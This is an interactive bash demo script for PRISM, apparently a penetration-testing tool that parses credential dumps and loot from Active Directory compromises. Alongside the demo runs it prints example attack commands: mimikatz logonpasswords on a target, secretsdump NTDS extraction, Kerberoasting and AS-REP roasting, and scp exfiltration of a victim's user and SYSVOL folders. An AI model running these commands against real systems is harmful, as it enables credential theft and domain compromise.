#!/bin/bash
# PRISM Interactive Demo Script
# Usage: ./demo.sh [option_number]

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# tools/post/prism/samples -> go up 4 levels to crack/
CRACK_DIR="$(dirname "$(dirname "$(dirname "$(dirname "$SCRIPT_DIR")")")")"

# Change to crack directory for relative paths
cd "$CRACK_DIR" || exit 1

# Check if Neo4j is available
check_neo4j() {
    # Try to connect to Neo4j bolt port
    if command -v nc &>/dev/null; then
        nc -z localhost 7687 2>/dev/null && return 0
    elif command -v curl &>/dev/null; then
        curl -s --connect-timeout 1 http://localhost:7474 &>/dev/null && return 0
    fi
    return 1
}

# Set neo4j flag based on availability
if check_neo4j; then
    NEO4J_FLAG=""
    NEO4J_STATUS="${GREEN}connected${NC}"
else
    NEO4J_FLAG="--no-neo4j"
    NEO4J_STATUS="${DIM}not detected${NC}"
fi

# ═══════════════════════════════════════════════════════════════
# Helper Functions
# ═══════════════════════════════════════════════════════════════

print_header() {
    echo -e "\n${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${WHITE}$1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}\n"
}

print_section() {
    echo -e "${YELLOW}${BOLD}$1${NC}"
}

print_command() {
    echo -e "  ${GREEN}$1${NC}"
}

print_dim() {
    echo -e "  ${DIM}$1${NC}"
}

print_feature() {
    echo -e "  ${MAGENTA}•${NC} $1"
}

wait_for_input() {
    echo ""
    echo -e "${DIM}Press Enter to run, or 's' to skip...${NC}"
    read -r response
    if [[ "$response" == "s" || "$response" == "S" ]]; then
        return 1
    fi
    return 0
}

run_command() {
    echo -e "\n${CYAN}─────────────────────────────────────────────────────────────────${NC}"
    echo -e "${DIM}Running: $1${NC}"
    echo -e "${CYAN}─────────────────────────────────────────────────────────────────${NC}\n"
    eval "$1"
    echo ""
    echo -e "${DIM}Press Enter to continue...${NC}"
    read -r
}

# ═══════════════════════════════════════════════════════════════
# Demo Functions
# ═══════════════════════════════════════════════════════════════

demo_mimikatz() {
    clear
    print_header "PARSER: Mimikatz Logonpasswords"

    print_section "COMMAND:"
    print_command "crack prism tools/post/prism/samples/mimikatz_logonpasswords.txt"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# On target after running mimikatz"
    print_command "mimikatz.exe \"sekurlsa::logonpasswords\" exit > loot.txt"
    echo ""
    print_dim "# Parse on Kali"
    print_command "crack prism loot.txt"
    echo ""
    print_dim "# Or pipe directly"
    print_command "cat loot.txt | crack prism --parser mimikatz"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "Cleartext password detection (HIGH VALUE yellow banner)"
    print_feature "Service account filtering (DWM-1, UMFD-0 auto-excluded)"
    print_feature "Machine account detection (accounts ending in \$)"
    print_feature "Session tracking (Interactive vs Service logons)"

    if wait_for_input; then
        run_command "python3 -m crack.tools.post.prism.cli tools/post/prism/samples/mimikatz_logonpasswords.txt $NEO4J_FLAG"
    fi
}

demo_secretsdump() {
    clear
    print_header "PARSER: Secretsdump / NTDS Hashes"

    print_section "COMMAND:"
    print_command "crack prism tools/post/prism/samples/secretsdump_ntds.txt"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Dump NTDS.dit remotely"
    print_command "secretsdump.py CORP/admin:pass@DC01 -just-dc-ntlm > ntds.txt"
    echo ""
    print_dim "# Parse the dump"
    print_command "crack prism ntds.txt"
    echo ""
    print_dim "# Or pipe directly"
    print_command "secretsdump.py CORP/admin:pass@DC01 | crack prism --parser secretsdump"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "NTDS hash extraction (user:rid:lm:nt format)"
    print_feature "Empty hash filtering (Guest with 31d6cfe0... excluded)"
    print_feature "Kerberos key extraction (AES256, AES128, DES)"
    print_feature "Machine account separation (DC01\$, WS01\$)"

    if wait_for_input; then
        run_command "python3 -m crack.tools.post.prism.cli tools/post/prism/samples/secretsdump_ntds.txt $NEO4J_FLAG"
    fi
}

demo_kerberoast() {
    clear
    print_header "PARSER: Kerberoast TGS Hashes"

    print_section "COMMAND:"
    print_command "crack prism tools/post/prism/samples/kerberoast_hashes.txt"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Request TGS tickets for service accounts"
    print_command "GetUserSPNs.py CORP/user:pass -dc-ip 10.10.10.10 -request > tgs.txt"
    echo ""
    print_dim "# Parse the hashes"
    print_command "crack prism tgs.txt"
    echo ""
    print_dim "# Or pipe directly"
    print_command "GetUserSPNs.py CORP/user:pass -dc-ip 10.10.10.10 -request | crack prism --parser kerberoast"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "TGS hash extraction (\$krb5tgs\$23\$...)"
    print_feature "SPN detection (MSSQLSvc, HTTP, CIFS)"
    print_feature "Hashcat mode reference (mode 13100)"
    print_feature "Username and domain parsing"

    if wait_for_input; then
        run_command "python3 -m crack.tools.post.prism.cli tools/post/prism/samples/kerberoast_hashes.txt $NEO4J_FLAG"
    fi
}

demo_asreproast() {
    clear
    print_header "PARSER: AS-REP Roast Hashes"

    print_section "COMMAND:"
    print_command "crack prism tools/post/prism/samples/asreproast_hashes.txt"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Find users without Kerberos preauth"
    print_command "GetNPUsers.py CORP/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat > asrep.txt"
    echo ""
    print_dim "# Parse the hashes"
    print_command "crack prism asrep.txt"
    echo ""
    print_dim "# Or pipe directly"
    print_command "GetNPUsers.py CORP/ -usersfile users.txt -dc-ip 10.10.10.10 | crack prism --parser kerberoast"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "AS-REP hash extraction (\$krb5asrep\$23\$...)"
    print_feature "Users with DONT_REQ_PREAUTH flag"
    print_feature "Hashcat mode reference (mode 18200)"
    print_feature "Cross-reference with NTDS hashes"

    if wait_for_input; then
        run_command "python3 -m crack.tools.post.prism.cli tools/post/prism/samples/asreproast_hashes.txt $NEO4J_FLAG"
    fi
}

demo_ldap() {
    clear
    print_header "PARSER: LDAP Enumeration"

    print_section "COMMAND:"
    print_command "crack prism tools/post/prism/samples/ldap_enum.ldif"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Anonymous LDAP enumeration"
    print_command "ldapsearch -x -H ldap://DC01 -b \"DC=corp,DC=local\" > ldap.ldif"
    echo ""
    print_dim "# Authenticated enumeration"
    print_command "ldapsearch -x -H ldap://DC01 -D \"user@corp.local\" -w pass -b \"DC=corp,DC=local\" > ldap.ldif"
    echo ""
    print_dim "# Parse the output"
    print_command "crack prism ldap.ldif"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "${RED}Legacy password detection (CRITICAL - instant win!)${NC}"
    print_feature "Kerberoastable user detection (servicePrincipalName)"
    print_feature "AS-REP roastable detection (userAccountControl flag)"
    print_feature "${YELLOW}Password hints in descriptions (svc_sql shows 'pw: Summer2024!')${NC}"
    print_feature "Admin account enumeration (adminCount=1)"
    print_feature "Attack path suggestions"

    if wait_for_input; then
        run_command "python3 -m crack.tools.post.prism.cli tools/post/prism/samples/ldap_enum.ldif $NEO4J_FLAG"
    fi
}

demo_smbmap() {
    clear
    print_header "PARSER: SMBMap Share Enumeration"

    print_section "COMMAND:"
    print_command "crack prism tools/post/prism/samples/smbmap_output.txt"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Enumerate SMB shares recursively"
    print_command "smbmap -H 10.10.10.10 -u user -p pass -R > shares.txt"
    echo ""
    print_dim "# Parse the output"
    print_command "crack prism shares.txt"
    echo ""
    print_dim "# Or pipe directly"
    print_command "smbmap -H 10.10.10.10 -u user -p pass -R | crack prism --parser smbmap"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "${RED}High-value file detection (GPP Groups.xml, SSH keys)${NC}"
    print_feature "Writable share identification (attack vectors)"
    print_feature "File categorization with attack reasoning"
    print_feature "Detects: passwords.txt, web.config, id_rsa, NTDS.dit backups"

    if wait_for_input; then
        run_command "python3 -m crack.tools.post.prism.cli tools/post/prism/samples/smbmap_output.txt $NEO4J_FLAG"
    fi
}

demo_report() {
    clear
    print_header "FEATURE: Domain Report (Neo4j Query)"

    print_section "COMMAND:"
    print_command "crack prism report --list-domains"
    print_command "crack prism report --domain CORP.LOCAL"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# After parsing multiple credential sources"
    print_command "crack prism mimikatz.txt"
    print_command "crack prism ntds.txt"
    print_command "crack prism kerberoast.txt"
    echo ""
    print_dim "# Query aggregated data"
    print_command "crack prism report --domain CORP.LOCAL"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "Aggregated view from Neo4j"
    print_feature "Cross-tool correlation (same cred from multiple sources)"
    print_feature "Timestamp tracking (first_seen, last_seen)"
    print_feature "Occurrence counting (how many times each cred found)"
    print_feature "Section filtering (--section users, credentials, etc.)"

    if wait_for_input; then
        echo -e "\n${YELLOW}Note: Requires Neo4j connection. Showing list-domains first...${NC}\n"
        run_command "export NEO4J_PASSWORD='Neo4j123' && python3 -m crack.tools.post.prism.cli report --list-domains 2>/dev/null || echo 'Neo4j not available - skipping'"
    fi
}

demo_export() {
    clear
    print_header "FEATURE: Export Reports (.md + .json)"

    print_section "COMMAND:"
    print_command "crack prism report --domain CORP.LOCAL"
    print_dim "# Creates: prism-CORP_LOCAL/"
    print_dim "#   ├── CORP_LOCAL_report_<timestamp>.json"
    print_dim "#   └── CORP_LOCAL_report_<timestamp>.md"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Generate exportable reports for documentation"
    print_command "crack prism report --domain CORP.LOCAL"
    print_command "ls -la prism-CORP_LOCAL/"
    echo ""
    print_dim "# Single file output (legacy)"
    print_command "crack prism report --domain CORP.LOCAL -o report.md -f markdown"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "Timestamped filenames (no overwrites)"
    print_feature "Untruncated output (all credentials, all users)"
    print_feature "Source summary table (which tools found what)"
    print_feature "Duplicate tracking section"
    print_feature "JSON includes credentials_by_source grouping"

    if wait_for_input; then
        echo -e "\n${YELLOW}Note: Creates directory in current location. Showing example...${NC}\n"
        run_command "export NEO4J_PASSWORD='Neo4j123' && python3 -m crack.tools.post.prism.cli report --domain CORP.LOCAL 2>/dev/null && ls -la prism-CORP_LOCAL/ 2>/dev/null || echo 'Neo4j not available - skipping'"
    fi
}

demo_purge() {
    clear
    print_header "FEATURE: Purge Domain Data"

    print_section "COMMAND:"
    print_command "crack prism purge --domain CORP.LOCAL --dry-run"
    print_command "crack prism purge --domain CORP.LOCAL"
    print_command "crack prism purge --all --dry-run"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# Preview what would be deleted"
    print_command "crack prism purge --domain CORP.LOCAL --dry-run"
    echo ""
    print_dim "# Actually delete (requires confirmation)"
    print_command "crack prism purge --domain CORP.LOCAL"
    echo ""
    print_dim "# Delete all PRISM data"
    print_command "crack prism purge --all"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "Dry-run mode (preview without deleting)"
    print_feature "Per-node-type counts (users, credentials, computers)"
    print_feature "Confirmation required (type 'yes')"
    print_feature "Force flag to skip confirmation (--force)"

    if wait_for_input; then
        echo -e "\n${YELLOW}Running dry-run only (safe)...${NC}\n"
        run_command "export NEO4J_PASSWORD='Neo4j123' && python3 -m crack.tools.post.prism.cli purge --domain CORP.LOCAL --dry-run 2>/dev/null || echo 'Neo4j not available - skipping'"
    fi
}

demo_crawl() {
    clear
    print_header "FEATURE: Directory Crawl (Loot Dump Analysis)"

    print_section "COMMAND:"
    print_command "crack prism crawl <directory>"
    print_command "crack prism crawl <directory> --depth 3"
    print_command "crack prism crawl <directory> --dry-run"
    echo ""

    print_section "REAL-WORLD USAGE:"
    print_dim "# After exfiltrating data from a compromised system"
    print_command "scp -r victim:/C\$/Users/ ./loot/"
    print_command "scp -r victim:/C\$/Windows/SYSVOL/ ./loot/"
    echo ""
    print_dim "# Parse everything at once - extract signal from noise"
    print_command "crack prism crawl ./loot/"
    echo ""
    print_dim "# Preview first (dry-run)"
    print_command "crack prism crawl ./loot/ --dry-run"
    echo ""
    print_dim "# Limit depth for faster scanning"
    print_command "crack prism crawl ./loot/ --depth 3"
    echo ""

    print_section "HIGHLIGHTED FEATURES:"
    print_feature "Recursive directory scanning with depth control"
    print_feature "Auto-detection of parseable files (GPP, mimikatz, NTDS, etc.)"
    print_feature "Binary file filtering (skips .exe, .dll, .pdf, etc.)"
    print_feature "Aggregate summary across all parsed files"
    print_feature "${YELLOW}Signal extraction from noisy system dumps${NC}"
    print_feature "Dry-run mode to preview without parsing"

    if wait_for_input; then
        echo -e "\n${YELLOW}Running crawl on sample loot_dump directory...${NC}\n"
        run_command "python3 -m crack.tools.post.prism.cli crawl tools/post/prism/samples/loot_dump/ $NEO4J_FLAG"
    fi
}

run_all() {
    demo_mimikatz
    demo_secretsdump
    demo_kerberoast
    demo_asreproast
    demo_ldap
    demo_smbmap
    demo_crawl
    demo_report
    demo_export
    demo_purge

    clear
    print_header "DEMO COMPLETE"
    echo -e "${GREEN}All PRISM features demonstrated!${NC}\n"
    echo "Sample files location:"
    echo -e "  ${CYAN}$SCRIPT_DIR/${NC}\n"
    echo "For more information:"
    echo -e "  ${CYAN}crack prism --help${NC}"
    echo -e "  ${CYAN}crack prism report --help${NC}"
    echo -e "  ${CYAN}crack prism purge --help${NC}"
}

show_menu() {
    clear
    # Rainbow gradient PRISM banner - like light through a prism
    echo ""
    echo -e "\033[38;5;196m  ██████╗ \033[38;5;208m██████╗ \033[38;5;226m██╗\033[38;5;46m███████╗\033[38;5;51m███╗   ███╗\033[0m"
    echo -e "\033[38;5;196m  ██╔══██╗\033[38;5;208m██╔══██╗\033[38;5;226m██║\033[38;5;46m██╔════╝\033[38;5;51m████╗ ████║\033[0m"
    echo -e "\033[38;5;196m  ██████╔╝\033[38;5;208m██████╔╝\033[38;5;226m██║\033[38;5;46m███████╗\033[38;5;51m██╔████╔██║\033[0m"
    echo -e "\033[38;5;196m  ██╔═══╝ \033[38;5;208m██╔══██╗\033[38;5;226m██║\033[38;5;46m╚════██║\033[38;5;51m██║╚██╔╝██║\033[0m"
    echo -e "\033[38;5;196m  ██║     \033[38;5;208m██║  ██║\033[38;5;226m██║\033[38;5;46m███████║\033[38;5;51m██║ ╚═╝ ██║\033[0m"
    echo -e "\033[38;5;196m  ╚═╝     \033[38;5;208m╚═╝  ╚═╝\033[38;5;226m╚═╝\033[38;5;46m╚══════╝\033[38;5;51m╚═╝     ╚═╝\033[0m"
    echo ""
    echo -e "  ${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${DIM}Light enters as chaos. Leaves as spectrum.${NC}"
    echo -e "  ${WHITE}Where noise becomes signal, and dumps become gold.${NC}"
    echo -e "  ${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "                                      ${DIM}Neo4j:${NC} $NEO4J_STATUS"
    echo ""

    echo -e "${BOLD}${WHITE}  ◈ PARSERS ${DIM}─────────────────────────────────────────${NC}"
    echo -e "  \033[38;5;196m1)\033[0m Mimikatz           ${DIM}Cleartext from memory's depths${NC}"
    echo -e "  \033[38;5;208m2)\033[0m Secretsdump        ${DIM}NTDS treasures, hash by hash${NC}"
    echo -e "  \033[38;5;226m3)\033[0m Kerberoast         ${DIM}Golden tickets in the shadows${NC}"
    echo -e "  \033[38;5;46m4)\033[0m AS-REP Roast       ${DIM}Preauth-less, defenseless${NC}"
    echo -e "  \033[38;5;51m5)\033[0m LDAP               ${DIM}Directory secrets unveiled${NC}"
    echo -e "  \033[38;5;129m6)\033[0m SMBMap             ${DIM}Shares whisper their contents${NC}"
    echo ""
    echo -e "${BOLD}${WHITE}  ◈ FEATURES ${DIM}────────────────────────────────────────${NC}"
    echo -e "  ${CYAN}7)${NC} Directory Crawl     ${DIM}Refine signal from the noise${NC}"
    echo ""
    echo -e "${BOLD}${WHITE}  ◈ NEO4J ${DIM}───────────────────────────────────────────${NC}"
    echo -e "  ${YELLOW}8)${NC} Domain Report       ${DIM}Query the knowledge graph${NC}"
    echo -e "  ${YELLOW}9)${NC} Export Reports      ${DIM}Crystallize findings to file${NC}"
    echo -e "  ${YELLOW}10)${NC} Purge Domain       ${DIM}Clear the slate${NC}"
    echo ""
    echo -e "  ${MAGENTA}0)${NC} Run All             ${DIM}The full spectrum${NC}"
    echo -e "  ${RED}q)${NC} Quit"
    echo ""
    echo -n "  Enter selection: "
}

# ═══════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════

# Check if argument provided (direct option)
if [[ -n "$1" ]]; then
    case "$1" in
        1) demo_mimikatz ;;
        2) demo_secretsdump ;;
        3) demo_kerberoast ;;
        4) demo_asreproast ;;
        5) demo_ldap ;;
        6) demo_smbmap ;;
        7) demo_crawl ;;
        8) demo_report ;;
        9) demo_export ;;
        10) demo_purge ;;
        0) run_all ;;
        *) echo "Invalid option: $1"; exit 1 ;;
    esac
    exit 0
fi

# Interactive menu loop
while true; do
    show_menu
    read -r choice

    case "$choice" in
        1) demo_mimikatz ;;
        2) demo_secretsdump ;;
        3) demo_kerberoast ;;
        4) demo_asreproast ;;
        5) demo_ldap ;;
        6) demo_smbmap ;;
        7) demo_crawl ;;
        8) demo_report ;;
        9) demo_export ;;
        10) demo_purge ;;
        0) run_all ;;
        q|Q) echo -e "\n${GREEN}Goodbye!${NC}\n"; exit 0 ;;
        *) echo -e "\n${RED}Invalid option${NC}"; sleep 1 ;;
    esac
done
